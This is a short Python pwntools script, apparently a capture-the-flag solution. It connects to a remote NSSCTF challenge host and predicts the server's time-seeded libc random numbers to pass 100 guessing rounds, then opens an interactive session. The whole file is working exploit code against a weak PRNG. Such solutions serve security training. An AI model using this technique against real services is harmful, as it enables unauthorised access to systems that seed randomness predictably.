from pwn import *
from ctypes import *

libc = cdll.LoadLibrary("/usr/lib/libc.so.6")
context.log_level = "debug"

libc.srand(libc.time(0))


# io = process("./pwn")
io = remote("node5.anna.nssctf.cn", 21086)

io.recvuntil(b"Who goes there?")
io.sendline(b"hello")
for i in range(100):
    io.recvuntil(b"What is it?")
    io.sendline(str(libc.rand() % 100000 + 1).encode())
io.interactive()
